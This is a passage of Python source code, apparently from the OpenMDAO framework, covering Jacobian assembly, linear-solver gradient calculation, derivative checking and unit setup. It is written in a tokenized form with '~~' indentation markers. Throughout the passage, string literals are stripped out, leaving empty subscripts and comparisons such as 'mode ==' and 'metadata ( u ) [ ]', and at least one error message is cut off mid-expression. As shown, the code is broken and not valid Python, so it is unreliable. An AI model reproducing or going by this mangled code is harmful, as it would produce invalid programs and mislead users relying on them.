~~~ J [ okey ] = OrderedDict ( ) \n 
for j , ikey in enumerate ( indep_list ) : \n 
\n 
# Support sparsity \n 
~~~ if sparsity is not None : \n 
~~~ if ikey not in sparsity [ okey ] : \n 
~~~ continue \n 
\n 
~~ ~~ abs_ikey = abs_params [ j ] \n 
fd_ikey = get_fd_ikey ( abs_ikey ) \n 
\n 
# Support for IndepVarComps that are buried in sub-Groups \n 
if ( okey , fd_ikey ) not in Jfd : \n 
~~~ fd_ikey = to_abs_pnames [ fd_ikey ] [ 0 ] \n 
\n 
~~ J [ okey ] [ ikey ] = Jfd [ ( okey , fd_ikey ) ] \n 
\n 
# Driver scaling \n 
if ikey in dv_scale : \n 
~~~ J [ okey ] [ ikey ] *= dv_scale [ ikey ] \n 
~~ if okey in cn_scale : \n 
~~~ J [ okey ] [ ikey ] *= cn_scale [ okey ] \n 
\n 
~~ ~~ ~~ ~~ else : \n 
~~~ usize = 0 \n 
psize = 0 \n 
for u in unknown_list : \n 
~~~ if u in self . _qoi_indices : \n 
~~~ idx = self . _qoi_indices [ u ] \n 
usize += len ( idx ) \n 
~~ else : \n 
~~~ usize += self . root . unknowns . metadata ( u ) [ ] \n 
~~ ~~ for p in indep_list : \n 
~~~ if p in self . _poi_indices : \n 
~~~ idx = self . _poi_indices [ p ] \n 
psize += len ( idx ) \n 
~~ else : \n 
~~~ psize += self . root . unknowns . metadata ( p ) [ ] \n 
~~ ~~ J = np . zeros ( ( usize , psize ) ) \n 
\n 
ui = 0 \n 
for u in unknown_list : \n 
~~~ pi = 0 \n 
for j , p in enumerate ( indep_list ) : \n 
~~~ abs_ikey = abs_params [ j ] \n 
fd_ikey = get_fd_ikey ( abs_ikey ) \n 
\n 
# Support for IndepVarComps that are buried in sub-Groups \n 
if ( u , fd_ikey ) not in Jfd : \n 
~~~ fd_ikey = to_abs_pnames [ fd_ikey ] [ 0 ] \n 
\n 
~~ pd = Jfd [ u , fd_ikey ] \n 
rows , cols = pd . shape \n 
\n 
for row in range ( 0 , rows ) : \n 
~~~ for col in range ( 0 , cols ) : \n 
~~~ J [ ui + row ] [ pi + col ] = pd [ row ] [ col ] \n 
# Driver scaling \n 
if p in dv_scale : \n 
~~~ J [ ui + row ] [ pi + col ] *= dv_scale [ p ] \n 
~~ if u in cn_scale : \n 
~~~ J [ ui + row ] [ pi + col ] *= cn_scale [ u ] \n 
~~ ~~ ~~ pi += cols \n 
~~ ui += rows \n 
~~ ~~ return J \n 
\n 
~~ def _calc_gradient_ln_solver ( self , indep_list , unknown_list , return_format , mode , \n 
dv_scale = None , cn_scale = None , sparsity = None ) : \n 
~~~ """ Returns the gradient for the system that is specified in\n        self.root. The gradient is calculated using root.ln_solver.\n\n        Args\n        ----\n        indep_list : list of strings\n            List of independent variable names that derivatives are to\n            be calculated with respect to. All params must have a IndepVarComp.\n\n        unknown_list : list of strings\n            List of output or state names that derivatives are to\n            be calculated for. All must be valid unknowns in OpenMDAO.\n\n        return_format : string\n            Format for the derivatives, can be \'array\' or \'dict\'.\n\n        mode : string\n            Deriviative direction, can be \'fwd\', \'rev\', \'fd\', or \'auto\'.\n            Default is \'auto\', which uses mode specified on the linear solver\n            in root.\n\n        dv_scale : dict, optional\n            Dictionary of driver-defined scale factors on the design variables.\n\n        cn_scale : dict, optional\n            Dictionary of driver-defined scale factors on the constraints.\n\n        sparsity : dict, optional\n            Dictionary that gives the relevant design variables for each\n            constraint. This option is only supported in the `dict` return\n            format.\n\n        Returns\n        -------\n        ndarray or dict\n            Jacobian of unknowns with respect to params.\n        """ \n 
\n 
root = self . root \n 
relevance = root . _probdata . relevance \n 
unknowns = root . unknowns \n 
unknowns_dict = root . _unknowns_dict \n 
to_abs_uname = root . _sysdata . to_abs_uname \n 
comm = root . comm \n 
iproc = comm . rank \n 
nproc = comm . size \n 
owned = root . _owning_ranks \n 
\n 
if dv_scale is None : \n 
~~~ dv_scale = { } \n 
~~ if cn_scale is None : \n 
~~~ cn_scale = { } \n 
\n 
# Respect choice of mode based on precedence. \n 
# Call arg > ln_solver option > auto-detect \n 
~~ mode = self . _mode ( mode , indep_list , unknown_list ) \n 
\n 
fwd = mode == \n 
\n 
# Prepare model for calculation \n 
root . clear_dparams ( ) \n 
for names in root . _probdata . relevance . vars_of_interest ( mode ) : \n 
~~~ for name in names : \n 
~~~ if name in root . dumat : \n 
~~~ root . dumat [ name ] . vec [ : ] = 0.0 \n 
root . drmat [ name ] . vec [ : ] = 0.0 \n 
~~ ~~ ~~ root . dumat [ None ] . vec [ : ] = 0.0 \n 
root . drmat [ None ] . vec [ : ] = 0.0 \n 
\n 
# Linearize Model \n 
root . _sys_linearize ( root . params , unknowns , root . resids ) \n 
\n 
# Initialize Jacobian \n 
if return_format == : \n 
~~~ J = OrderedDict ( ) \n 
for okeys in unknown_list : \n 
~~~ if isinstance ( okeys , str ) : \n 
~~~ okeys = ( okeys , ) \n 
~~ for okey in okeys : \n 
~~~ J [ okey ] = OrderedDict ( ) \n 
for ikeys in indep_list : \n 
~~~ if isinstance ( ikeys , str ) : \n 
~~~ ikeys = ( ikeys , ) \n 
~~ for ikey in ikeys : \n 
\n 
# Support sparsity \n 
~~~ if sparsity is not None : \n 
~~~ if ikey not in sparsity [ okey ] : \n 
~~~ continue \n 
\n 
~~ ~~ J [ okey ] [ ikey ] = None \n 
~~ ~~ ~~ ~~ ~~ else : \n 
~~~ usize = 0 \n 
psize = 0 \n 
Jslices = OrderedDict ( ) \n 
for u in unknown_list : \n 
~~~ start = usize \n 
if u in self . _qoi_indices : \n 
~~~ idx = self . _qoi_indices [ u ] \n 
usize += len ( idx ) \n 
~~ else : \n 
~~~ usize += self . root . unknowns . metadata ( u ) [ ] \n 
~~ Jslices [ u ] = slice ( start , usize ) \n 
\n 
~~ for p in indep_list : \n 
~~~ start = psize \n 
if p in self . _poi_indices : \n 
~~~ idx = self . _poi_indices [ p ] \n 
psize += len ( idx ) \n 
~~ else : \n 
~~~ psize += unknowns . metadata ( p ) [ ] \n 
~~ Jslices [ p ] = slice ( start , psize ) \n 
~~ J = np . zeros ( ( usize , psize ) ) \n 
\n 
~~ if fwd : \n 
~~~ input_list , output_list = indep_list , unknown_list \n 
poi_indices , qoi_indices = self . _poi_indices , self . _qoi_indices \n 
in_scale , un_scale = dv_scale , cn_scale \n 
~~ else : \n 
~~~ input_list , output_list = unknown_list , indep_list \n 
qoi_indices , poi_indices = self . _poi_indices , self . _qoi_indices \n 
in_scale , un_scale = cn_scale , dv_scale \n 
\n 
# Process our inputs/outputs of interest for parallel groups \n 
~~ all_vois = self . root . _probdata . relevance . vars_of_interest ( mode ) \n 
\n 
input_set = set ( ) \n 
for inp in input_list : \n 
~~~ if isinstance ( inp , str ) : \n 
~~~ input_set . add ( inp ) \n 
~~ else : \n 
~~~ input_set . update ( inp ) \n 
\n 
# Our variables of interest include all sets for which at least \n 
# one variable is requested. \n 
~~ ~~ voi_sets = [ ] \n 
for voi_set in all_vois : \n 
~~~ for voi in voi_set : \n 
~~~ if voi in input_set : \n 
~~~ voi_sets . append ( voi_set ) \n 
break \n 
\n 
# Add any variables that the user "forgot". TODO: This won\'t be \n 
# necessary when we have an API to automatically generate the \n 
# IOI and OOI. \n 
~~ ~~ ~~ flat_voi = [ item for sublist in all_vois for item in sublist ] \n 
for items in input_list : \n 
~~~ if isinstance ( items , str ) : \n 
~~~ items = ( items , ) \n 
~~ for item in items : \n 
~~~ if item not in flat_voi : \n 
# Put them in serial groups \n 
~~~ voi_sets . append ( ( item , ) ) \n 
\n 
~~ ~~ ~~ voi_srcs = { } \n 
\n 
# If Forward mode, solve linear system for each param \n 
# If Adjoint mode, solve linear system for each unknown \n 
for params in voi_sets : \n 
~~~ rhs = OrderedDict ( ) \n 
voi_idxs = { } \n 
\n 
old_size = None \n 
\n 
# Allocate all of our Right Hand Sides for this parallel set. \n 
for voi in params : \n 
~~~ vkey = self . _get_voi_key ( voi , params ) \n 
\n 
duvec = self . root . dumat [ vkey ] \n 
rhs [ vkey ] = np . empty ( ( len ( duvec . vec ) , ) ) \n 
\n 
voi_srcs [ vkey ] = voi \n 
if voi in duvec : \n 
~~~ in_idxs = duvec . _get_local_idxs ( voi , poi_indices ) \n 
~~ else : \n 
~~~ in_idxs = [ ] \n 
\n 
~~ if len ( in_idxs ) == 0 : \n 
~~~ if voi in poi_indices : \n 
\n 
~~~ in_idxs = duvec . to_idx_array ( poi_indices [ voi ] ) \n 
~~ else : \n 
~~~ in_idxs = np . arange ( 0 , unknowns_dict [ to_abs_uname [ voi ] ] [ ] , dtype = int ) \n 
\n 
~~ ~~ if old_size is None : \n 
~~~ old_size = len ( in_idxs ) \n 
~~ elif old_size != len ( in_idxs ) : \n 
~~~ raise RuntimeError ( "Indices within the same VOI group must be the same size, but" " in the group %s, %d != %d" % ( params , old_size , len ( in_idxs ~~ voi_idxs [ vkey ] = in_idxs \n 
\n 
# at this point, we know that for all vars in the current \n 
# group of interest, the number of indices is the same. We loop \n 
# over the *size* of the indices and use the loop index to look \n 
# up the actual indices for the current members of the group \n 
# of interest. \n 
~~ for i in range ( len ( in_idxs ) ) : \n 
~~~ for voi in params : \n 
~~~ vkey = self . _get_voi_key ( voi , params ) \n 
rhs [ vkey ] [ : ] = 0.0 \n 
\n 
# Note, we solve a slightly modified version of the unified \n 
# derivatives equations in OpenMDAO. \n 
# (dR/du) * (du/dr) = -I \n 
if self . root . _owning_ranks [ voi_srcs [ vkey ] ] == iproc : \n 
~~~ rhs [ vkey ] [ voi_idxs [ vkey ] [ i ] ] = - 1.0 \n 
\n 
# Solve the linear system \n 
~~ ~~ dx_mat = root . ln_solver . solve ( rhs , root , mode ) \n 
\n 
for param , dx in iteritems ( dx_mat ) : \n 
~~~ vkey = self . _get_voi_key ( param , params ) \n 
if param is None : \n 
~~~ param = params [ 0 ] \n 
\n 
~~ for item in output_list : \n 
\n 
# Support sparsity \n 
~~~ if sparsity is not None : \n 
~~~ if fwd and param not in sparsity [ item ] : \n 
~~~ continue \n 
~~ elif not fwd and item not in sparsity [ param ] : \n 
~~~ continue \n 
\n 
~~ ~~ if relevance . is_relevant ( vkey , item ) : \n 
~~~ if fwd or owned [ item ] == iproc : \n 
~~~ out_idxs = self . root . dumat [ vkey ] . _get_local_idxs ( item , \n 
qoi_indices , \n 
get_slice = True ) \n 
dxval = dx [ out_idxs ] \n 
if dxval . size == 0 : \n 
~~~ dxval = None \n 
~~ ~~ else : \n 
~~~ dxval = None \n 
~~ if nproc > 1 : \n 
# TODO: make this use Bcast for efficiency \n 
~~~ if trace : \n 
~~~ debug ( "calc_gradient_ln_solver dxval bcast. dxval=%s, root=%s, param=%s, item=%s" ( dxval , owned [ item ] , param , item ) ) \n 
~~ dxval = comm . bcast ( dxval , root = owned [ item ] ) \n 
if trace : \n 
~~~ debug ( "dxval bcast DONE" ) \n 
~~ ~~ ~~ else : \n 
~~~ if item in qoi_indices : \n 
~~~ zsize = len ( qoi_indices [ item ] ) \n 
~~ else : \n 
~~~ zsize = unknowns . metadata ( item ) [ ] \n 
~~ dxval = np . zeros ( zsize ) \n 
\n 
~~ if dxval is not None : \n 
~~~ nk = len ( dxval ) \n 
\n 
if return_format == : \n 
~~~ if fwd : \n 
~~~ if J [ item ] [ param ] is None : \n 
~~~ J [ item ] [ param ] = np . zeros ( ( nk , len ( in_idxs ) ) ) \n 
~~ J [ item ] [ param ] [ : , i ] = dxval \n 
\n 
# Driver scaling \n 
if param in in_scale : \n 
~~~ J [ item ] [ param ] [ : , i ] *= in_scale [ param ] \n 
~~ if item in un_scale : \n 
~~~ J [ item ] [ param ] [ : , i ] *= un_scale [ item ] \n 
~~ ~~ else : \n 
~~~ if J [ param ] [ item ] is None : \n 
~~~ J [ param ] [ item ] = np . zeros ( ( len ( in_idxs ) , nk ) ) \n 
~~ J [ param ] [ item ] [ i , : ] = dxval \n 
\n 
# Driver scaling \n 
if param in in_scale : \n 
~~~ J [ param ] [ item ] [ i , : ] *= in_scale [ param ] \n 
~~ if item in un_scale : \n 
~~~ J [ param ] [ item ] [ i , : ] *= un_scale [ item ] \n 
\n 
~~ ~~ ~~ else : \n 
~~~ if fwd : \n 
~~~ J [ Jslices [ item ] , Jslices [ param ] . start + i ] = dxval \n 
\n 
# Driver scaling \n 
if param in in_scale : \n 
~~~ J [ Jslices [ item ] , Jslices [ param ] . start + i ] *= in_scale [ param ] \n 
~~ if item in un_scale : \n 
~~~ J [ Jslices [ item ] , Jslices [ param ] . start + i ] *= un_scale [ item ] \n 
\n 
~~ ~~ else : \n 
~~~ J [ Jslices [ param ] . start + i , Jslices [ item ] ] = dxval \n 
\n 
# Driver scaling \n 
if param in in_scale : \n 
~~~ J [ Jslices [ param ] . start + i , Jslices [ item ] ] *= in_scale [ param ] \n 
~~ if item in un_scale : \n 
~~~ J [ Jslices [ param ] . start + i , Jslices [ item ] ] *= un_scale [ item ] \n 
\n 
# Clean up after ourselves \n 
~~ ~~ ~~ ~~ ~~ ~~ ~~ ~~ root . clear_dparams ( ) \n 
\n 
return J \n 
\n 
~~ def _get_voi_key ( self , voi , grp ) : \n 
~~~ """Return the voi name, which allows for parallel derivative calculations\n        (currently only works with LinearGaussSeidel), or None for those\n        solvers that can only do a single linear solve at a time.\n        """ \n 
if ( voi in self . _driver_vois and \n 
isinstance ( self . root . ln_solver , LinearGaussSeidel ) ) : \n 
~~~ if ( len ( grp ) > 1 or \n 
self . root . ln_solver . options [ ] ) : \n 
~~~ return voi \n 
\n 
~~ ~~ return None \n 
\n 
~~ def check_partial_derivatives ( self , out_stream = sys . stdout , comps = None , \n 
compact_print = False ) : \n 
~~~ """ Checks partial derivatives comprehensively for all components in\n        your model.\n\n        Args\n        ----\n\n        out_stream : file_like\n            Where to send human readable output. Default is sys.stdout. Set to\n            None to suppress.\n\n        comps : None or list_like\n            List of component names to check the partials of (all others will be skipped).\n            Set to None (default) to run all components\n\n        compact_print : bool\n            Set to True to just print the essentials, one line per unknown-param\n            pair.\n\n        Returns\n        -------\n        Dict of Dicts of Dicts\n\n        First key is the component name;\n        2nd key is the (output, input) tuple of strings;\n        third key is one of [\'rel error\', \'abs error\', \'magnitude\', \'J_fd\', \'J_fwd\', \'J_rev\'];\n\n        For \'rel error\', \'abs error\', \'magnitude\' the value is:\n\n            A tuple containing norms for forward - fd, adjoint - fd, forward - adjoint using the best case fdstep\n\n        For \'J_fd\', \'J_fwd\', \'J_rev\' the value is:\n\n            A numpy array representing the computed Jacobian for the three different methods of computation\n\n        """ \n 
\n 
root = self . root \n 
\n 
if self . driver . iter_count < 1 : \n 
~~~ out_stream . write ( ) \n 
self . run_once ( ) \n 
\n 
# Linearize the model \n 
~~ root . _sys_linearize ( root . params , root . unknowns , root . resids ) \n 
\n 
if out_stream is not None : \n 
~~~ out_stream . write ( ) \n 
\n 
~~ data = { } \n 
\n 
# Derivatives should just be checked without parallel adjoint for now. \n 
voi = None \n 
\n 
# Check derivative calculations for all comps at every level of the \n 
# system hierarchy. \n 
allcomps = root . components ( recurse = True ) \n 
if comps is None : \n 
~~~ comps = allcomps \n 
~~ else : \n 
~~~ allcompnames = set ( [ c . pathname for c in allcomps ] ) \n 
requested = set ( comps ) \n 
diff = requested . difference ( allcompnames ) \n 
\n 
if diff : \n 
~~~ sorted_diff = list ( diff ) \n 
sorted_diff . sort ( ) \n 
msg = "The following are not valid comp names: " \n 
msg += str ( sorted_diff ) \n 
raise RuntimeError ( msg ) \n 
\n 
~~ comps = [ root . _subsystem ( c_name ) for c_name in comps ] \n 
\n 
~~ for comp in comps : \n 
~~~ cname = comp . pathname \n 
opt = comp . fd_options \n 
\n 
fwd_rev = True \n 
if opt [ ] : \n 
~~~ f_d_2 = True \n 
fd_desc = opt [ ] \n 
fd_desc2 = opt [ ] \n 
~~ else : \n 
~~~ f_d_2 = False \n 
fd_desc = None \n 
fd_desc2 = None \n 
\n 
\n 
# comparing 2 different fds. \n 
~~ if opt [ ] : \n 
~~~ if not f_d_2 : \n 
~~~ continue \n 
~~ fwd_rev = False \n 
\n 
# IndepVarComps are just clutter too. \n 
~~ if isinstance ( comp , IndepVarComp ) : \n 
~~~ continue \n 
\n 
~~ data [ cname ] = { } \n 
jac_fwd = OrderedDict ( ) \n 
jac_rev = OrderedDict ( ) \n 
jac_fd = OrderedDict ( ) \n 
jac_fd2 = OrderedDict ( ) \n 
\n 
params = comp . params \n 
unknowns = comp . unknowns \n 
resids = comp . resids \n 
dparams = comp . dpmat [ voi ] \n 
dunknowns = comp . dumat [ voi ] \n 
dresids = comp . drmat [ voi ] \n 
states = comp . states \n 
\n 
# Skip if all of our inputs are unconnected. \n 
if len ( dparams ) == 0 : \n 
~~~ continue \n 
\n 
# Work with all params that are not pbo. \n 
~~ param_list = [ item for item in dparams if not dparams . metadata ( item ) . get ( ) ] \n 
param_list . extend ( states ) \n 
unkn_list = [ item for item in dunknowns if not dunknowns . metadata ( item ) . get ( ) ] \n 
\n 
if out_stream is not None : \n 
~~~ out_stream . write ( * ( len ( cname ) + 15 ) + ) \n 
out_stream . write ( "Component: \'%s\'\\n" % cname ) \n 
out_stream . write ( * ( len ( cname ) + 15 ) + ) \n 
\n 
# Create all our keys and allocate Jacs \n 
~~ for p_name in param_list : \n 
\n 
# No need to pre-allocate if we are not calculating them \n 
~~~ if not fwd_rev : \n 
~~~ break \n 
\n 
~~ dinputs = dunknowns if p_name in states else dparams \n 
p_size = np . size ( dinputs [ p_name ] ) \n 
\n 
# Check dimensions of user-supplied Jacobian \n 
for u_name in unkn_list : \n 
\n 
~~~ u_size = np . size ( dunknowns [ u_name ] ) \n 
if comp . _jacobian_cache : \n 
\n 
# We can perform some additional helpful checks. \n 
~~~ if ( u_name , p_name ) in comp . _jacobian_cache : \n 
\n 
~~~ user = comp . _jacobian_cache [ ( u_name , p_name ) ] . shape \n 
\n 
# User may use floats for scalar jacobians \n 
if len ( user ) < 2 : \n 
~~~ user = ( user [ 0 ] , 1 ) \n 
\n 
~~ if user [ 0 ] != u_size or user [ 1 ] != p_size : \n 
~~~ msg = "derivative in component \'{}\' of \'{}\' wrt \'{}\' is the wrong size. " "It should be {}, but got {}" \n 
msg = msg . format ( cname , u_name , p_name , ( u_size , p_size ) , user ) \n 
raise ValueError ( msg ) \n 
\n 
~~ ~~ ~~ jac_fwd [ ( u_name , p_name ) ] = np . zeros ( ( u_size , p_size ) ) \n 
jac_rev [ ( u_name , p_name ) ] = np . zeros ( ( u_size , p_size ) ) \n 
\n 
# Reverse derivatives first \n 
~~ ~~ if fwd_rev : \n 
~~~ for u_name in unkn_list : \n 
~~~ u_size = np . size ( dunknowns [ u_name ] ) \n 
\n 
# Send columns of identity \n 
for idx in range ( u_size ) : \n 
~~~ dresids . vec [ : ] = 0.0 \n 
root . clear_dparams ( ) \n 
dunknowns . vec [ : ] = 0.0 \n 
\n 
dresids . _dat [ u_name ] . val [ idx ] = 1.0 \n 
try : \n 
~~~ comp . apply_linear ( params , unknowns , dparams , \n 
dunknowns , dresids , ) \n 
~~ finally : \n 
~~~ dparams . _apply_unit_derivatives ( ) \n 
\n 
~~ for p_name in param_list : \n 
\n 
~~~ dinputs = dunknowns if p_name in states else dparams \n 
jac_rev [ ( u_name , p_name ) ] [ idx , : ] = dinputs . _dat [ p_name ] . val \n 
\n 
# Forward derivatives second \n 
~~ ~~ ~~ ~~ if fwd_rev : \n 
~~~ for p_name in param_list : \n 
\n 
~~~ dinputs = dunknowns if p_name in states else dparams \n 
p_size = np . size ( dinputs [ p_name ] ) \n 
\n 
# Send columns of identity \n 
for idx in range ( p_size ) : \n 
~~~ dresids . vec [ : ] = 0.0 \n 
root . clear_dparams ( ) \n 
dunknowns . vec [ : ] = 0.0 \n 
\n 
dinputs . _dat [ p_name ] . val [ idx ] = 1.0 \n 
dparams . _apply_unit_derivatives ( ) \n 
comp . apply_linear ( params , unknowns , dparams , \n 
dunknowns , dresids , ) \n 
\n 
for u_name , u_val in dresids . vec_val_iter ( ) : \n 
~~~ jac_fwd [ ( u_name , p_name ) ] [ : , idx ] = u_val \n 
\n 
# Finite Difference goes last \n 
~~ ~~ ~~ ~~ dresids . vec [ : ] = 0.0 \n 
root . clear_dparams ( ) \n 
dunknowns . vec [ : ] = 0.0 \n 
\n 
# Component can request to use complex step. \n 
if opt [ ] == : \n 
~~~ fd_func = comp . complex_step_jacobian \n 
~~ else : \n 
~~~ fd_func = comp . fd_jacobian \n 
\n 
~~ jac_fd = fd_func ( params , unknowns , resids ) \n 
\n 
# Extra Finite Difference if requested \n 
if f_d_2 : \n 
~~~ dresids . vec [ : ] = 0.0 \n 
root . clear_dparams ( ) \n 
dunknowns . vec [ : ] = 0.0 \n 
\n 
# Component can request to use complex step. \n 
if opt [ ] == : \n 
~~~ fd_func = comp . complex_step_jacobian \n 
~~ else : \n 
~~~ fd_func = comp . fd_jacobian \n 
\n 
# Cache old form so we can overide temporarily \n 
~~ save_form = opt [ ] \n 
OptionsDictionary . locked = False \n 
opt [ ] = opt [ ] \n 
\n 
jac_fd2 = fd_func ( params , unknowns , resids ) \n 
\n 
opt [ ] = save_form \n 
OptionsDictionary . locked = True \n 
\n 
# Assemble and Return all metrics. \n 
~~ _assemble_deriv_data ( chain ( dparams , states ) , resids , data [ cname ] , \n 
jac_fwd , jac_rev , jac_fd , out_stream , \n 
c_name = cname , jac_fd2 = jac_fd2 , fd_desc = fd_desc , \n 
fd_desc2 = fd_desc2 , compact_print = compact_print ) \n 
\n 
~~ return data \n 
\n 
~~ def check_total_derivatives ( self , out_stream = sys . stdout ) : \n 
~~~ """ Checks total derivatives for problem defined at the top.\n\n        Args\n        ----\n\n        out_stream : file_like\n            Where to send human readable output. Default is sys.stdout. Set to\n            None to suppress.\n\n        Returns\n        -------\n        Dict of Dicts of Tuples of Floats\n\n        First key is the (output, input) tuple of strings; second key is one\n        of [\'rel error\', \'abs error\', \'magnitude\', \'fdstep\']; Tuple contains\n        norms for forward - fd, adjoint - fd, forward - adjoint using the\n        best case fdstep.\n        """ \n 
root = self . root \n 
driver = self . driver \n 
\n 
if driver . iter_count < 1 : \n 
~~~ out_stream . write ( ) \n 
self . run_once ( ) \n 
\n 
~~ if out_stream is not None : \n 
~~~ out_stream . write ( ) \n 
\n 
# Check derivatives with respect to design variables, if they have \n 
# been defined.. \n 
~~ if len ( driver . _desvars ) > 0 : \n 
~~~ param_srcs = list ( driver . _desvars . keys ( ) ) \n 
to_abs_name = root . _sysdata . to_abs_uname \n 
indep_list = [ p for p in param_srcs if not root . _unknowns_dict [ to_abs_name [ p ] ] . get ( ) ] \n 
\n 
# Otherwise, use all available params. \n 
~~ else : \n 
~~~ abs_indep_list = root . _get_fd_params ( ) \n 
param_srcs = [ root . connections [ p ] for p in abs_indep_list if not root . _params_dict [ p ] . get ( ) ] \n 
\n 
# Convert absolute parameter names to promoted ones because it is \n 
# easier for the user to read. \n 
to_prom_name = self . root . _sysdata . to_prom_name \n 
indep_list = [ \n 
to_prom_name [ p ] for p , idxs in param_srcs \n 
] \n 
\n 
# Check derivatives of objectives and constraints, if they have \n 
# been defined.. \n 
~~ if len ( driver . _objs ) > 0 or len ( driver . _cons ) > 0 : \n 
~~~ unknown_list = list ( driver . _objs . keys ( ) ) \n 
unknown_list . extend ( list ( driver . _cons . keys ( ) ) ) \n 
unknown_list = [ item for item in unknown_list if not root . unknowns . metadata ( item ) . get ( ) ] \n 
\n 
# Otherwise, use all available unknowns. \n 
~~ else : \n 
~~~ unknown_list = root . _get_fd_unknowns ( ) \n 
unknown_list = [ item for item in unknown_list if not root . unknowns . metadata ( item ) . get ( ) ] \n 
\n 
# If we are using relevance reducton, then we are hard-wired for only \n 
# one mode \n 
~~ if root . ln_solver . options . get ( ) : \n 
~~~ mode = self . _mode ( , indep_list , unknown_list ) \n 
if mode == : \n 
~~~ fwd , rev = True , False \n 
Jrev = None \n 
if out_stream is not None : \n 
~~~ out_stream . write ( ) \n 
out_stream . write ( ) \n 
~~ ~~ else : \n 
~~~ fwd , rev = False , True \n 
Jfor = None \n 
if out_stream is not None : \n 
~~~ out_stream . write ( ) \n 
out_stream . write ( ) \n 
~~ ~~ ~~ else : \n 
~~~ fwd = rev = True \n 
\n 
# Calculate all our Total Derivatives \n 
~~ if fwd : \n 
~~~ Jfor = self . calc_gradient ( indep_list , unknown_list , mode = , \n 
return_format = ) \n 
Jfor = _jac_to_flat_dict ( Jfor ) \n 
\n 
~~ if rev : \n 
~~~ Jrev = self . calc_gradient ( indep_list , unknown_list , mode = , \n 
return_format = ) \n 
Jrev = _jac_to_flat_dict ( Jrev ) \n 
\n 
~~ Jfd = self . calc_gradient ( indep_list , unknown_list , mode = , \n 
return_format = ) \n 
Jfd = _jac_to_flat_dict ( Jfd ) \n 
\n 
# Assemble and Return all metrics. \n 
data = { } \n 
_assemble_deriv_data ( indep_list , unknown_list , data , \n 
Jfor , Jrev , Jfd , out_stream ) \n 
\n 
return data \n 
\n 
~~ def _start_recorders ( self ) : \n 
~~~ """ Prepare recorders for recording.""" \n 
\n 
self . driver . recorders . startup ( self . root ) \n 
self . driver . recorders . record_metadata ( self . root ) \n 
\n 
for group in self . root . subgroups ( recurse = True , include_self = True ) : \n 
~~~ for solver in ( group . nl_solver , group . ln_solver ) : \n 
~~~ solver . recorders . startup ( group ) \n 
solver . recorders . record_metadata ( self . root ) \n 
\n 
~~ ~~ ~~ def _check_for_parallel_derivs ( self , params , unknowns , par_u , par_p ) : \n 
~~~ """ Checks a system hiearchy to make sure that no settings violate the\n        assumptions needed for parallel dervivative calculation. Returns the\n        mode that the system needs to use.\n        """ \n 
\n 
mode = self . _mode ( , params , unknowns ) \n 
\n 
if mode == : \n 
~~~ has_parallel_derivs = par_p \n 
~~ else : \n 
~~~ has_parallel_derivs = par_u \n 
\n 
# the type of the root linear solver determines whether we solve \n 
# multiple RHS in parallel. Currently only LinearGaussSeidel can \n 
# support this. \n 
~~ if ( isinstance ( self . root . ln_solver , LinearGaussSeidel ) and \n 
self . root . ln_solver . options [ ] ) and has_parallel_derivs : \n 
\n 
~~~ for sub in self . root . subgroups ( recurse = True ) : \n 
~~~ sub_mode = sub . ln_solver . options [ ] \n 
\n 
# Modes must match root for all subs \n 
if isinstance ( sub . ln_solver , LinearGaussSeidel ) and sub_mode not in ( mode , ) : \n 
~~~ msg = "Group \'{name}\' has mode \'{submode}\' but the root group has mode \'{rootmode}\'." " Modes must match to use parallel derivative groups." \n 
msg = msg . format ( name = sub . name , submode = sub_mode , rootmode = mode ) \n 
self . _setup_errors . append ( msg ) \n 
\n 
~~ ~~ ~~ return mode \n 
\n 
~~ def _json_system_tree ( self ) : \n 
~~~ """ Returns a json representation of the system hierarchy for the\n        model in root.\n\n        Returns\n        -------\n        json string\n        """ \n 
\n 
def _tree_dict ( system ) : \n 
~~~ dct = OrderedDict ( ) \n 
for s in system . subsystems ( recurse = True ) : \n 
~~~ if isinstance ( s , Group ) : \n 
~~~ dct [ s . name ] = _tree_dict ( s ) \n 
~~ else : \n 
~~~ dct [ s . name ] = OrderedDict ( ) \n 
for vname , meta in iteritems ( s . unknowns ) : \n 
~~~ dct [ s . name ] [ vname ] = m = meta . copy ( ) \n 
for mname in m : \n 
~~~ if isinstance ( m [ mname ] , np . ndarray ) : \n 
~~~ m [ mname ] = m [ mname ] . tolist ( ) \n 
~~ ~~ ~~ ~~ ~~ return dct \n 
\n 
~~ tree = OrderedDict ( ) \n 
tree [ ] = _tree_dict ( self . root ) \n 
return json . dumps ( tree ) \n 
\n 
~~ def _setup_communicators ( self ) : \n 
~~~ if self . comm is None : \n 
~~~ self . comm = self . _impl . world_comm ( ) \n 
\n 
# first determine how many procs that root can possibly use \n 
~~ minproc , maxproc = self . driver . get_req_procs ( ) \n 
if MPI : \n 
~~~ if not ( maxproc is None or maxproc >= self . comm . size ) : \n 
# we have more procs than we can use, so just raise an \n 
# exception to encourage the user not to waste resources :) \n 
~~~ raise RuntimeError ( "This problem was given %d MPI processes, " \n 
"but it requires between %d and %d." % \n 
( self . comm . size , minproc , maxproc ) ) \n 
~~ elif self . comm . size < minproc : \n 
~~~ if maxproc is None : \n 
~~~ maxproc = \n 
~~ raise RuntimeError ( "This problem was given %d MPI processes, " \n 
"but it requires between %s and %s." % \n 
( self . comm . size , minproc , maxproc ) ) \n 
\n 
# TODO: once we have nested Problems, figure out proper Problem \n 
#       directory instead of just using getcwd(). \n 
~~ ~~ self . driver . _setup_communicators ( self . comm , os . getcwd ( ) ) \n 
\n 
~~ def _setup_units ( self , connections , params_dict , unknowns_dict ) : \n 
~~~ """\n        Calculate unit conversion factors for any connected\n        variables having different units and store them in params_dict.\n\n        Args\n        ----\n        connections : dict\n            A dict of target variables (absolute name) mapped\n            to the absolute name of their source variable and the\n            relevant indices of that source if applicable.\n\n        params_dict : OrderedDict\n            A dict of parameter metadata for the whole `Problem`.\n\n        unknowns_dict : OrderedDict\n            A dict of unknowns metadata for the whole `Problem`.\n        """ \n 
to_prom_name = self . root . _sysdata . to_prom_name \n 
\n 
for target , ( source , idxs ) in iteritems ( connections ) : \n 
~~~ tmeta = params_dict [ target ] \n 
smeta = unknowns_dict [ source ] \n 
\n 
# units must be in both src and target to have a conversion \n 
if not in tmeta or not in smeta : \n 
~~~ continue \n 
\n 
~~ src_unit = smeta [ ] \n 
tgt_unit = tmeta [ ] \n 
\n 
try : \n 
~~~ scale , offset = get_conversion_tuple ( src_unit , tgt_unit ) \n 
~~ except TypeError as err : \n 
~~~ if str ( err ) == "Incompatible units" : \n 
~~~ msg = "Unit \'{0}\' in source {1} " "is incompatible with unit \'{2}\' " "in target {3}." . format ( src_unit , \n 
_both_names ( smeta , to_prom_name ) , \n 
tgt_unit , \n 
